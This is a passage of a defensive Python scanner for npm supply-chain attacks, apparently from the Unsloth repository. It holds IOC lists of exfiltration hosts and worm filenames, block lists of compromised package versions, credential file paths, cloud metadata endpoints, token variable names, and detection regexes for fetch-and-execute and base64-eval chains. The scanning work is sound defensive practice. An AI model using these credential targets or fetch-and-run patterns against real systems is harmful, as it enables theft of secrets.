#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved.
#
# .github/workflows/security-audit.yml's npm-scan-packages job depends
# on this file existing at scripts/scan_npm_packages.py.

"""scan_npm_packages.py -- npm-side content scanner.

npm counterpart to scripts/scan_packages.py. Reads
studio/frontend/package-lock.json, downloads each resolved tarball
DIRECTLY from registry.npmjs.org (never via `npm install` -- no
lifecycle scripts run), verifies the lockfile integrity hash, unpacks
each into a sandboxed temp dir behind size/count/path-escape/symlink
guards, and pattern-scans extracted contents for npm supply-chain
attack signatures: malicious lifecycle scripts, C2 / exfil hosts,
credential-stealing references, known IOC filenames, and obfuscation
shapes.

Safety stance (ingests attacker-controlled archives; assumes worst):
  1. Downloads ONLY from registry.npmjs.org; other hosts refused.
  2. Tarball download size-capped via Content-Length probe + chunked
     read that aborts on overflow.
  3. SHA-512 integrity verified against the lockfile entry BEFORE the
     tarball is opened; mismatch aborts that package (no fallback).
  4. tar extraction via `safe_extract`: rejects symlinks, absolute /
     `..` paths, device files; enforces per-file, cumulative, and
     member-count caps; streams (`r|gz`) so oversize is caught early.
  5. NOTHING extracted is executed -- files are read as bytes and
     grepped only.
  6. Tempdir resolved and atexit-wiped on every termination path.
  7. Stdlib only (a dep would be a supply-chain liability itself).

Exit codes: 0 = no HIGH+ findings; 1 = HIGH/CRITICAL or pre-scan
structural anomaly; 2 = internal error. Run in CI per-PR and nightly.
"""

from __future__ import annotations

import argparse
import atexit
import base64 as _b64  # imported only so the IOC string-scan can detect it
import bisect
import hashlib
import io
import itertools
import json
import os
import re
import shutil
import sys
import tarfile
import tempfile
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]

# ─────────────────────────────────────────────────────────────────────
# Hard caps (deliberately conservative; npm tarballs in this repo are
# all well under these limits, so a packaging spike is noticeable).
# ─────────────────────────────────────────────────────────────────────
# Caps calibrated against the real Unsloth frontend transitive closure:
#   - typescript.js is 9.1 MB (TS compiler bundled into one file)
#   - mermaid 11.x dist/mermaid.js.map is ~12 MB (sourcemap)
#   - lightningcss-linux-x64-{gnu,musl}.node is 10 MB
#   - rolldown bindings (.node) are 18-26 MB per platform
#   - @next/swc-*.node is ~137 MB (rust-compiled SWC engine)
#   - next.js cumulative bundle is ~134 MB (turbopack compiled)
#
# Native binaries (.node, .wasm, .so, .dll, .dylib) are GENUINELY
# huge and not amenable to text pattern scanning -- we extract them
# only to verify the tarball integrity over the full archive, then
# skip them in scan_extracted_tree. They get a much higher per-file
# cap. Text files (JS/TS/JSON/etc) keep the tight cap because the
# pattern scanner runs over them and a 9.1 MB typescript.js is the
# legitimate ceiling.
HARD_MAX_TARBALL_BYTES = 256 * 1024 * 1024  # 256 MiB compressed
HARD_MAX_TEXT_FILE_BYTES = 16 * 1024 * 1024  # 16 MiB per text file
HARD_MAX_BINARY_FILE_BYTES = 256 * 1024 * 1024  # 256 MiB per .node etc
HARD_MAX_TOTAL_BYTES = 512 * 1024 * 1024  # 512 MiB cumulative
HARD_MAX_MEMBERS = 50_000  # entries per tarball
HARD_HTTP_TIMEOUT_S = 60  # per request

# Native-binary / compiled-asset suffixes that bypass the text cap.
# This is the SUFFIX shortlist; the content-magic check below covers
# extensionless executables (biome) and versioned shared libraries
# (libvips-cpp.so.8.17.3) that the suffix list misses.
_BINARY_SUFFIXES = (
    ".node",
    ".wasm",
    ".so",
    ".dll",
    ".dylib",
    ".exe",
    ".a",
    ".lib",
    ".o",
    ".obj",
    ".bin",
    ".dat",
    ".woff",
    ".woff2",
    ".ttf",
    ".otf",
    ".eot",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".webp",
    ".ico",
    ".mp3",
    ".mp4",
    ".webm",
    ".zip",
    ".tar",
    ".gz",
    ".tgz",
    ".xz",
    ".bz2",
)

# Versioned shared libraries: libfoo.so.1.2.3 / libfoo.dylib.1.2.
_VERSIONED_LIB = re.compile(
    r"\.(?:so|dylib)(?:\.\d+)+$",
    re.IGNORECASE,
)

# Magic numbers at offset 0 that identify common executable formats.
# We sniff the first ~16 bytes of every member to catch extensionless
# binaries (eg `package/biome`, `package/bin/foo`).
_BINARY_MAGICS = (
    b"\x7fELF",  # ELF (Linux executable / .so)
    b"MZ",  # PE / .exe / .dll (DOS header prefix)
    b"\xfe\xed\xfa\xce",  # Mach-O 32 BE
    b"\xfe\xed\xfa\xcf",  # Mach-O 64 BE
    b"\xce\xfa\xed\xfe",  # Mach-O 32 LE
    b"\xcf\xfa\xed\xfe",  # Mach-O 64 LE
    b"\xca\xfe\xba\xbe",  # Mach-O fat / Java class (also starts with this)
    b"\x00asm",  # WASM
    b"PK\x03\x04",  # ZIP / JAR / nupkg / xpi
    b"PK\x05\x06",  # ZIP (empty)
    b"\x1f\x8b",  # gzip
    b"BZh",  # bzip2
    b"\xfd7zXZ",  # xz
    b"7z\xbc\xaf\x27\x1c",  # 7zip
    b"\x89PNG",  # PNG
    b"\xff\xd8\xff",  # JPEG
    b"GIF8",  # GIF
    b"RIFF",  # WAV / WEBP / AVI container
    b"\x00\x00\x01\x00",  # ICO
    b"OggS",  # Ogg
    b"\x1aE\xdf\xa3",  # Matroska / WebM
)


def _looks_binary(name: str, header: bytes) -> bool:
    """True if `name` or first bytes suggest a non-text file."""
    lower = name.lower()
    if lower.endswith(_BINARY_SUFFIXES):
        return True
    if _VERSIONED_LIB.search(lower):
        return True
    for magic in _BINARY_MAGICS:
        if header.startswith(magic):
            return True
    # Null-byte density: real text files almost never carry NULs.
    if header and (header.count(b"\x00") / len(header)) > 0.02:
        return True
    return False


ALLOWED_DOWNLOAD_HOST = "registry.npmjs.org"

# ─────────────────────────────────────────────────────────────────────
# Severities + finding shape (mirrors scripts/scan_packages.py).
# ─────────────────────────────────────────────────────────────────────
CRITICAL = "CRITICAL"
HIGH = "HIGH"
MEDIUM = "MEDIUM"
INFO = "INFO"
_SEVERITY_RANK = {CRITICAL: 0, HIGH: 1, MEDIUM: 2, INFO: 3}


@dataclass
class Finding:
    severity: str
    package: str  # name@version
    filename: str  # relative path inside the tarball
    pattern: str  # what matched
    evidence: str = ""  # short surrounding snippet
    detail: str = ""  # human-readable description

    def __str__(self) -> str:
        head = f"  [{self.severity}] {self.package} :: {self.filename}"
        body = f"    pattern: {self.pattern}"
        if self.detail:
            body += f"\n    detail:  {self.detail}"
        if self.evidence:
            ev = self.evidence
            if len(ev) > 240:
                ev = ev[:240] + "..."
            body += f"\n    evidence: {ev!r}"
        return f"{head}\n{body}"


@dataclass
class PackageEntry:
    name: str
    version: str
    resolved: str
    integrity: str | None
    lockfile_key: str

    @property
    def display(self) -> str:
        return f"{self.name}@{self.version}"


# ─────────────────────────────────────────────────────────────────────
# IOC patterns. Two flavours:
#   - HOSTS / TOKEN_PATHS: high-confidence substrings; near-zero FP rate
#   - JS_PATTERNS / SCRIPT_PATTERNS: regex; tuned to recent campaigns
# Keep this list short and factual. Speculative patterns spam the
# false-positive ledger and dull the signal.
# ─────────────────────────────────────────────────────────────────────


# Substring (case-sensitive) -> (severity, detail).
KNOWN_IOC_STRINGS: dict[str, tuple[str, str]] = {
    # Shai-Hulud TanStack wave (2026-05-11, GHSA-g7cv-rxg3-hmpx).
    "router_init.js": (HIGH, "filename associated with TanStack worm"),
    "tanstack_runner.js": (HIGH, "filename associated with TanStack worm"),
    "router_runtime.js": (HIGH, "filename associated with TanStack worm"),
    "A Mini Shai-Hulud has Appeared": (
        CRITICAL,
        "TanStack worm campaign stdout marker",
    ),
    "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c": (
        CRITICAL,
        "TanStack worm dropper pinned commit",
    ),
    # Exfil hosts observed across both Shai-Hulud waves.
    "filev2.getsession.org": (CRITICAL, "exfiltration C2 host"),
    "getsession.org/file/": (CRITICAL, "exfiltration C2 endpoint"),
    # Mini Shai-Hulud May-12 2026 wave additions.
    "git-tanstack.com": (CRITICAL, "May-12 dropper host"),
    "transformers.pyz": (HIGH, "May-12 PyPI dropper artifact"),
    "/tmp/transformers.pyz": (CRITICAL, "May-12 dropper drop path"),
    "With Love TeamPCP": (CRITICAL, "May-12 campaign signature"),
    "We've been online over 2 hours": (CRITICAL, "May-12 campaign signature"),
    # Aikido (May-12 wave): payload SHA-256 hashes published in IOCs.
    "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c": (
        HIGH,
        "router_init.js payload SHA-256",
    ),
    "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96": (
        HIGH,
        "tanstack_runner.js payload SHA-256",
    ),
    # The new dependency vector: optional dep -> Bun-executed prepare script.
    "bun run tanstack_runner.js": (
        CRITICAL,
        "TanStack-wave Bun prepare-script dropper invocation",
    ),
    "@tanstack/setup": (
        CRITICAL,
        "TanStack-wave optional-dep dropper carrier (no legit pkg of this name)",
    ),
}

# Hard pin-blocks for publicly confirmed malicious versions.
# name -> {malicious_versions...}. A match short-circuits the scan
# at the lockfile-walk stage; no tarball is fetched.
# keep in sync with scripts/lockfile_supply_chain_audit.py
BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
    # GHSA-g7cv-rxg3-hmpx -- TanStack May-11 2026 (84 versions).
    "@tanstack/arktype-adapter": {"1.166.12", "1.166.15"},
    "@tanstack/eslint-plugin-router": {"1.161.9", "1.161.12"},
    "@tanstack/eslint-plugin-start": {"0.0.4", "0.0.7"},
    "@tanstack/history": {"1.161.9", "1.161.12"},
    "@tanstack/nitro-v2-vite-plugin": {"1.154.12", "1.154.15"},
    "@tanstack/react-router": {"1.169.5", "1.169.8"},
    "@tanstack/react-router-devtools": {"1.166.16", "1.166.19"},
    "@tanstack/react-router-ssr-query": {"1.166.15", "1.166.18"},
    "@tanstack/react-start": {"1.167.68", "1.167.71"},
    "@tanstack/react-start-client": {"1.166.51", "1.166.54"},
    "@tanstack/react-start-rsc": {"0.0.47", "0.0.50"},
    "@tanstack/react-start-server": {"1.166.55", "1.166.58"},
    "@tanstack/router-cli": {"1.166.46", "1.166.49"},
    "@tanstack/router-core": {"1.169.5", "1.169.8"},
    "@tanstack/router-devtools": {"1.166.16", "1.166.19"},
    "@tanstack/router-devtools-core": {"1.167.6", "1.167.9"},
    "@tanstack/router-generator": {"1.166.45", "1.166.48"},
    "@tanstack/router-plugin": {"1.167.38", "1.167.41"},
    "@tanstack/router-ssr-query-core": {"1.168.3", "1.168.6"},
    "@tanstack/router-utils": {"1.161.11", "1.161.14"},
    "@tanstack/router-vite-plugin": {"1.166.53", "1.166.56"},
    "@tanstack/solid-router": {"1.169.5", "1.169.8"},
    "@tanstack/solid-router-devtools": {"1.166.16", "1.166.19"},
    "@tanstack/solid-router-ssr-query": {"1.166.15", "1.166.18"},
    "@tanstack/solid-start": {"1.167.65", "1.167.68"},
    "@tanstack/solid-start-client": {"1.166.50", "1.166.53"},
    "@tanstack/solid-start-server": {"1.166.54", "1.166.57"},
    "@tanstack/start-client-core": {"1.168.5", "1.168.8"},
    "@tanstack/start-fn-stubs": {"1.161.9", "1.161.12"},
    "@tanstack/start-plugin-core": {"1.169.23", "1.169.26"},
    "@tanstack/start-server-core": {"1.167.33", "1.167.36"},
    "@tanstack/start-static-server-functions": {"1.166.44", "1.166.47"},
    "@tanstack/start-storage-context": {"1.166.38", "1.166.41"},
    "@tanstack/valibot-adapter": {"1.166.12", "1.166.15"},
    "@tanstack/virtual-file-routes": {"1.161.10", "1.161.13"},
    "@tanstack/vue-router": {"1.169.5", "1.169.8"},
    "@tanstack/vue-router-devtools": {"1.166.16", "1.166.19"},
    "@tanstack/vue-router-ssr-query": {"1.166.15", "1.166.18"},
    "@tanstack/vue-start": {"1.167.61", "1.167.64"},
    "@tanstack/vue-start-client": {"1.166.46", "1.166.49"},
    "@tanstack/vue-start-server": {"1.166.50", "1.166.53"},
    "@tanstack/zod-adapter": {"1.166.12", "1.166.15"},
    # Mini Shai-Hulud May-12 wave: OpenSearch JS client.
    "@opensearch-project/opensearch": {"3.5.3", "3.6.2", "3.7.0", "3.8.0"},
    # Mini Shai-Hulud May-12 wave: @squawk/* (22 packages, 5 versions each;
    # https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/).
    "@squawk/airport-data": {"0.7.4", "0.7.5", "0.7.6", "0.7.7", "0.7.8"},
    "@squawk/airports": {"0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6"},
    "@squawk/airspace": {"0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5"},
    "@squawk/airspace-data": {"0.5.3", "0.5.4", "0.5.5", "0.5.6", "0.5.7"},
    "@squawk/airway-data": {"0.5.4", "0.5.5", "0.5.6", "0.5.7", "0.5.8"},
    "@squawk/airways": {"0.4.2", "0.4.3", "0.4.4", "0.4.5", "0.4.6"},
    "@squawk/fix-data": {"0.6.4", "0.6.5", "0.6.6", "0.6.7", "0.6.8"},
    "@squawk/fixes": {"0.3.2", "0.3.3", "0.3.4", "0.3.5", "0.3.6"},
    "@squawk/flight-math": {"0.5.4", "0.5.5", "0.5.6", "0.5.7", "0.5.8"},
    "@squawk/flightplan": {"0.5.2", "0.5.3", "0.5.4", "0.5.5", "0.5.6"},
    "@squawk/geo": {"0.4.4", "0.4.5", "0.4.6", "0.4.7", "0.4.8"},
    "@squawk/icao-registry": {"0.5.2", "0.5.3", "0.5.4", "0.5.5", "0.5.6"},
    "@squawk/icao-registry-data": {"0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8"},
    "@squawk/mcp": {"0.9.1", "0.9.2", "0.9.3", "0.9.4", "0.9.5"},
    "@squawk/navaid-data": {"0.6.4", "0.6.5", "0.6.6", "0.6.7", "0.6.8"},
    "@squawk/navaids": {"0.4.2", "0.4.3", "0.4.4", "0.4.5", "0.4.6"},
    "@squawk/notams": {"0.3.6", "0.3.7", "0.3.8", "0.3.9", "0.3.10"},
    "@squawk/procedure-data": {"0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.7.7"},
    "@squawk/procedures": {"0.5.2", "0.5.3", "0.5.4", "0.5.5", "0.5.6"},
    "@squawk/types": {"0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5"},
    "@squawk/units": {"0.4.3", "0.4.4", "0.4.5", "0.4.6", "0.4.7"},
    "@squawk/weather": {"0.5.6", "0.5.7", "0.5.8", "0.5.9", "0.5.10"},
    # Mini Shai-Hulud May-12 wave: @uipath/* (64 packages, single version each;
    # https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised).
    "@uipath/apollo-react": {"4.24.5"},
    "@uipath/apollo-wind": {"2.16.2"},
    "@uipath/cli": {"1.0.1"},
    "@uipath/rpa-tool": {"0.9.5"},
    "@uipath/apollo-core": {"5.9.2"},
    "@uipath/filesystem": {"1.0.1"},
    "@uipath/solutionpackager-tool-core": {"0.0.34"},
    "@uipath/solution-tool": {"1.0.1"},
    "@uipath/maestro-tool": {"1.0.1"},
    "@uipath/codedapp-tool": {"1.0.1"},
    "@uipath/agent-tool": {"1.0.1"},
    "@uipath/orchestrator-tool": {"1.0.1"},
    "@uipath/integrationservice-tool": {"1.0.2"},
    "@uipath/rpa-legacy-tool": {"1.0.1"},
    "@uipath/vertical-solutions-tool": {"1.0.1"},
    "@uipath/flow-tool": {"1.0.2"},
    "@uipath/codedagent-tool": {"1.0.1"},
    "@uipath/common": {"1.0.1"},
    "@uipath/resource-tool": {"1.0.1"},
    "@uipath/auth": {"1.0.1"},
    "@uipath/docsai-tool": {"1.0.1"},
    "@uipath/case-tool": {"1.0.1"},
    "@uipath/api-workflow-tool": {"1.0.1"},
    "@uipath/test-manager-tool": {"1.0.2"},
    "@uipath/robot": {"1.3.4"},
    "@uipath/traces-tool": {"1.0.1"},
    "@uipath/agent-sdk": {"1.0.2"},
    "@uipath/integrationservice-sdk": {"1.0.2"},
    "@uipath/maestro-sdk": {"1.0.1"},
    "@uipath/data-fabric-tool": {"1.0.2"},
    "@uipath/tasks-tool": {"1.0.1"},
    "@uipath/insights-tool": {"1.0.1"},
    "@uipath/insights-sdk": {"1.0.1"},
    "@uipath/uipath-python-bridge": {"1.0.1"},
    "@uipath/ap-chat": {"1.5.7"},
    "@uipath/project-packager": {"1.1.16"},
    "@uipath/packager-tool-case": {"0.0.9"},
    "@uipath/packager-tool-workflowcompiler-browser": {"0.0.34"},
    "@uipath/packager-tool-connector": {"0.0.19"},
    "@uipath/packager-tool-workflowcompiler": {"0.0.16"},
    "@uipath/packager-tool-webapp": {"1.0.6"},
    "@uipath/packager-tool-apiworkflow": {"0.0.19"},
    "@uipath/packager-tool-functions": {"0.1.1"},
    "@uipath/widget.sdk": {"1.2.3"},
    "@uipath/resources-tool": {"0.1.11"},
    "@uipath/agent.sdk": {"0.0.18"},
    "@uipath/codedagents-tool": {"0.1.12"},
    "@uipath/aops-policy-tool": {"0.3.1"},
    "@uipath/solution-packager": {"0.0.35"},
    "@uipath/packager-tool-bpmn": {"0.0.9"},
    "@uipath/packager-tool-flow": {"0.0.19"},
    "@uipath/telemetry": {"0.0.7"},
    "@uipath/tool-workflowcompiler": {"0.0.12"},
    "@uipath/vss": {"0.1.6"},
    "@uipath/solutionpackager-sdk": {"1.0.11"},
    "@uipath/ui-widgets-multi-file-upload": {"1.0.1"},
    "@uipath/access-policy-tool": {"0.3.1"},
    "@uipath/context-grounding-tool": {"0.1.1"},
    "@uipath/gov-tool": {"0.3.1"},
    "@uipath/admin-tool": {"0.1.1"},
    "@uipath/identity-tool": {"0.1.1"},
    "@uipath/llmgw-tool": {"1.0.1"},
    "@uipath/resourcecatalog-tool": {"0.1.1"},
    "@uipath/functions-tool": {"1.0.1"},
    "@uipath/access-policy-sdk": {"0.3.1"},
    "@uipath/platform-tool": {"1.0.1"},
    # Mini Shai-Hulud May-12 wave: @mistralai/* (npm), separate from PyPI mistralai
    # (https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised).
    "@mistralai/mistralai": {"2.2.2", "2.2.3", "2.2.4"},
    "@mistralai/mistralai-gcp": {"1.7.1", "1.7.2", "1.7.3"},
    "@mistralai/mistralai-azure": {"1.7.1", "1.7.2", "1.7.3"},
    # Mini Shai-Hulud May-12 wave: @tallyui/* (30 entries, 10 packages)
    # (Aikido enumeration).
    "@tallyui/components": {"1.0.1", "1.0.2", "1.0.3"},
    "@tallyui/connector-medusa": {"1.0.1", "1.0.2", "1.0.3"},
    "@tallyui/connector-shopify": {"1.0.1", "1.0.2", "1.0.3"},
    "@tallyui/connector-vendure": {"1.0.1", "1.0.2", "1.0.3"},
    "@tallyui/connector-woocommerce": {"1.0.1", "1.0.2", "1.0.3"},
    "@tallyui/core": {"0.2.1", "0.2.2", "0.2.3"},
    "@tallyui/database": {"1.0.1", "1.0.2", "1.0.3"},
    "@tallyui/pos": {"0.1.1", "0.1.2", "0.1.3"},
    "@tallyui/storage-sqlite": {"0.2.1", "0.2.2", "0.2.3"},
    "@tallyui/theme": {"0.2.1", "0.2.2", "0.2.3"},
    # Mini Shai-Hulud May-12 wave: @beproduct/nestjs-auth (18 versions)
    # (Aikido enumeration).
    "@beproduct/nestjs-auth": {
        "0.1.2",
        "0.1.3",
        "0.1.4",
        "0.1.5",
        "0.1.6",
        "0.1.7",
        "0.1.8",
        "0.1.9",
        "0.1.10",
        "0.1.11",
        "0.1.12",
        "0.1.13",
        "0.1.14",
        "0.1.15",
        "0.1.16",
        "0.1.17",
        "0.1.18",
        "0.1.19",
    },
    # Mini Shai-Hulud May-12 wave: @draftlab/* + @draftauth/*
    # (Aikido enumeration).
    "@draftauth/client": {"0.2.1", "0.2.2"},
    "@draftauth/core": {"0.13.1", "0.13.2"},
    "@draftlab/auth": {"0.24.1", "0.24.2"},
    "@draftlab/auth-router": {"0.5.1", "0.5.2"},
    "@draftlab/db": {"0.16.1"},
    # Mini Shai-Hulud May-12 wave: @taskflow-corp/cli + @tolka/cli
    # (Aikido enumeration).
    "@taskflow-corp/cli": {"0.1.24", "0.1.25", "0.1.26", "0.1.27", "0.1.28", "0.1.29"},
    "@tolka/cli": {"1.0.2", "1.0.3", "1.0.4", "1.0.5", "1.0.6"},
    # Mini Shai-Hulud May-12 wave: @ml-toolkit-ts/* + @mesadev/* + @dirigible-ai/sdk + @supersurkhet/*
    # (Aikido enumeration).
    "@dirigible-ai/sdk": {"0.6.2", "0.6.3"},
    "@mesadev/rest": {"0.28.3"},
    "@mesadev/saguaro": {"0.4.22"},
    "@mesadev/sdk": {"0.28.3"},
    "@ml-toolkit-ts/preprocessing": {"1.0.2", "1.0.3"},
    "@ml-toolkit-ts/xgboost": {"1.0.3", "1.0.4"},
    "@supersurkhet/cli": {"0.0.2", "0.0.3", "0.0.4", "0.0.5", "0.0.6", "0.0.7"},
    "@supersurkhet/sdk": {"0.0.2", "0.0.3", "0.0.4", "0.0.5", "0.0.6", "0.0.7"},
    # Mini Shai-Hulud May-12 wave: Unscoped packages (10 entries)
    # (Aikido enumeration).
    "safe-action": {"0.8.3", "0.8.4"},
    "ts-dna": {"3.0.1", "3.0.2", "3.0.3", "3.0.4"},
    "cross-stitch": {"1.1.3", "1.1.4", "1.1.5", "1.1.6"},
    "cmux-agent-mcp": {"0.1.3", "0.1.4", "0.1.5", "0.1.6", "0.1.7", "0.1.8"},
    "agentwork-cli": {"0.1.4", "0.1.5"},
    "git-branch-selector": {"1.3.3", "1.3.4", "1.3.5", "1.3.6", "1.3.7"},
    "wot-api": {"0.8.1", "0.8.2", "0.8.3", "0.8.4"},
    "git-git-git": {"1.0.8", "1.0.9", "1.0.10", "1.0.11", "1.0.12"},
    "nextmove-mcp": {"0.1.3", "0.1.4", "0.1.5", "0.1.6", "0.1.7"},
    "ml-toolkit-ts": {"1.0.4", "1.0.5"},
    # Cross-ecosystem Mini Shai-Hulud (Apr-30 wave): npm counterpart of
    # PyPI lightning 2.6.2/2.6.3. Same threat actor (TeamPCP) per Semgrep,
    # Aikido, OX Security, Resecurity. Safe version: 7.0.3 and earlier.
    "intercom-client": {"7.0.4"},
}

# Cloud / k8s / CI credential surfaces. A bare substring match here
# false-positives on DEFENSIVE code -- e.g. langchain ships an SSRF
# protection module with a literal blocklist of IMDS IPs. We split
# these into two tiers:
#
#   ALWAYS_BAD: substrings with no legitimate use anywhere in a
#     dependency. A bare match is enough.
#
#   NEEDS_CONTEXT: hosts/paths that DO appear legitimately in
#     defensive code. We only fire when they co-occur with a fetch
#     verb or appear inside an http URL -- that is the structural
#     difference between "blocked address constant" and "exfil
#     target".
#
# The dispatch lives in `_scan_cred_surface` below.

CRED_HOST_ALWAYS_BAD: tuple[tuple[str, str], ...] = (
    ("registry.npmjs.org/-/npm/v1/tokens", "npm publish-token enumeration endpoint"),
    ("ACTIONS_ID_TOKEN_REQUEST_URL", "GitHub Actions OIDC token-exchange endpoint env"),
    ("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "GitHub Actions OIDC token-exchange token env"),
)

# Hosts that need fetch-verb or URL-scheme context to be malicious.
CRED_HOST_NEEDS_CONTEXT: tuple[tuple[str, str], ...] = (
    ("169.254.169.254", "AWS / GCP / Azure instance metadata service (IMDS)"),
    ("169.254.170.2", "ECS task metadata service"),
    ("metadata.google.internal", "GCE metadata service"),
    ("vault.svc.cluster.local", "in-cluster HashiCorp Vault endpoint"),
    (
        "/var/run/secrets/kubernetes.io/serviceaccount",
        "Kubernetes ServiceAccount token path",
    ),
)

# Credentials a frontend package should never read. Bare substring
# match is too noisy (legit dev tooling mounts ~/.npmrc), so we flag
# these only inside lifecycle scripts -- the only auto-run path on
# `npm ci`. See `scan_package_json` below.
CRED_PATH_SUBSTRINGS: tuple[tuple[str, str], ...] = (
    ("/.npmrc", "npm credentials file"),
    ("/.aws/credentials", "AWS shared credentials file"),
    ("/.ssh/id_rsa", "SSH private key"),
    ("/.ssh/id_ed25519", "SSH private key"),
    ("/.docker/config.json", "Docker registry credentials"),
    ("/.kube/config", "Kubernetes kubeconfig"),
)

# Fetch verbs whose presence near a metadata host upgrades a bare
# substring hit into an actionable finding.
_FETCH_VERBS_PAT = (
    r"(?:fetch|axios|XMLHttpRequest|got\b|undici|"
    r"http\.get|https\.get|http\.request|https\.request|"
    r"new\s+URL|url\.parse|net\.connect|"
    r"\.request\s*\(|\.get\s*\(\s*['\"]\s*https?://)"
)

# JS regex patterns (compile lazily).
_JS_FETCH_EVAL = re.compile(
    r"""(?xs)
    (?:
      Function\s*\(\s*['"`]                      # new Function("...")
      | eval\s*\(\s*['"`]
      | \(\s*0\s*,\s*eval\s*\)\s*\(
    )
    .{0,200}
    (?:atob\s*\(|Buffer\s*\.from\s*\([^)]+,\s*['"]base64)
    """,
)

# Token env access in install-time code; also catches os.environ[...]
# for the rare Python-in-npm postinstall.
_JS_ENV_TOKEN = re.compile(
    r"""(process\.env\.|os\.environ\[?['"])(?:
        GITHUB_TOKEN | GH_TOKEN | NPM_TOKEN | NODE_AUTH_TOKEN
        | AWS_ACCESS_KEY_ID | AWS_SECRET_ACCESS_KEY | AWS_SESSION_TOKEN
        | GOOGLE_APPLICATION_CREDENTIALS
        | DOCKER_AUTH_CONFIG | VAULT_TOKEN
    )['"]?\]?""",
    re.VERBOSE,
)

# Lifecycle-script fetch+exec chain: curl/wget an external resource
# and run it. Bare curl/wget is allowed (legit fixture fetches); only
# the fetch+exec chain is blocked.
_LIFECYCLE_FETCH_EXEC = re.compile(
    r"""(?xs)
    (?:curl|wget|fetch|http\.get|axios\.get)\s+ # fetch verb
    .{0,200}
    (?:\|\s*(?:sh|bash|node|python|eval)\b      # pipe to interpreter
      | \&\&\s*(?:sh|bash|node|python|eval)\b   # &&-chain to interpreter
      | -o\s+\S+\s*&&\s*(?:sh|bash|node|python) # download then run
      | --post-file\s+
      | \$\(.*\)                                # command-sub of fetched content
    )
    """,
)

# Obfuscation: large single-line base64-ish blob behind Function()/
# eval(). Tuned against the router_init.js shape (2.3 MB blob).
_OBFUSC_BLOB = re.compile(
    r"""(?xs)
    (?:Function|eval)\s*\(\s*['"`]?
    [A-Za-z0-9+/=_-]{2048,}                    # >=2 KiB of b64-ish
    """,
)


# ─────────────────────────────────────────────────────────────────────
# Lockfile parsing.
# ─────────────────────────────────────────────────────────────────────


def parse_lockfile(path: Path) -> tuple[list[PackageEntry], list[Finding]]:
    """Return (entries, structural_findings).

    Structural findings are HIGH-severity refusals that short-circuit
    the scan (e.g. non-registry resolved URLs). A summary is surfaced
    here so this scanner is standalone-runnable.
    """
    entries: list[PackageEntry] = []
    findings: list[Finding] = []

    try:
        lock = json.loads(path.read_text(encoding = "utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        findings.append(
            Finding(
                severity = CRITICAL,
                package = "<root>",
                filename = str(path),
                pattern = "lockfile-unreadable",
                detail = f"could not parse: {exc}",
            )
        )
        return entries, findings

    if lock.get("lockfileVersion") not in (2, 3):
        findings.append(
            Finding(
                severity = HIGH,
                package = "<root>",
                filename = str(path),
                pattern = "unsupported-lockfile-version",
                detail = (
                    f"only lockfileVersion 2 or 3 supported; got "
                    f"{lock.get('lockfileVersion')!r}"
                ),
            )
        )
        return entries, findings

    for key, entry in (lock.get("packages") or {}).items():
        if key == "" or entry.get("link"):
            continue
        # Nested fold-ins (deps inside another package's node_modules/)
        # are covered by the parent tarball's integrity. Skip.
        if key.count("/node_modules/") >= 1:
            continue
        resolved = entry.get("resolved")
        if not resolved:
            continue
        # Strict registry origin check so this scanner can't be tricked
        # into fetching from an attacker-chosen URL.
        parsed = urllib.parse.urlparse(resolved)
        if parsed.scheme != "https" or parsed.hostname != ALLOWED_DOWNLOAD_HOST:
            findings.append(
                Finding(
                    severity = CRITICAL,
                    package = key,
                    filename = str(path),
                    pattern = "non-registry-resolved-url",
                    detail = (
                        f"resolved={resolved!r}; only "
                        f"https://{ALLOWED_DOWNLOAD_HOST}/ is "
                        "permitted. Refusing to download."
                    ),
                )
            )
            continue
        integrity = entry.get("integrity")
        if not integrity:
            findings.append(
                Finding(
                    severity = HIGH,
                    package = key,
                    filename = str(path),
                    pattern = "missing-integrity-hash",
                    detail = "no `integrity` field; cannot verify download",
                )
            )
            continue
        # node_modules/@scope/name -> @scope/name; node_modules/name -> name
        nm = "node_modules/"
        name = key[len(nm) :] if key.startswith(nm) else key
        version = entry.get("version") or "<unversioned>"
        entries.append(
            PackageEntry(
                name = name,
                version = version,
                resolved = resolved,
                integrity = integrity,
                lockfile_key = key,
            )
        )
    return entries, findings


# ─────────────────────────────────────────────────────────────────────
# Tarball download (registry-only, size-capped, integrity-verified).
# ─────────────────────────────────────────────────────────────────────


def _decode_integrity(integrity: str) -> tuple[str, bytes] | None:
    """Parse SRI integrity 'sha512-<base64>' -> (algo, digest_bytes)."""
    if "-" not in integrity:
        return None
    algo, b64 = integrity.split("-", 1)
    algo = algo.strip().lower()
    if algo not in ("sha256", "sha384", "sha512"):
        return None
    try:
        digest = _b64.b64decode(b64, validate = True)
    except Exception:
        return None
    return algo, digest


def download_tarball(
    entry: PackageEntry,
    dest: Path,
    *,
    timeout: float = HARD_HTTP_TIMEOUT_S,
    max_bytes: int = HARD_MAX_TARBALL_BYTES,
) -> tuple[Path, str | None]:
    """Stream-download entry.resolved to dest and verify SRI integrity.

    Returns (downloaded_path, error_or_none); on error the path may not
    exist. Network access is restricted to ALLOWED_DOWNLOAD_HOST.
    """
    # Re-assert hostname (defence-in-depth against a future refactor).
    parsed = urllib.parse.urlparse(entry.resolved)
    if parsed.scheme != "https" or parsed.hostname != ALLOWED_DOWNLOAD_HOST:
        return dest, (f"refused download from non-allowlisted URL {entry.resolved!r}")

    decoded = _decode_integrity(entry.integrity or "")
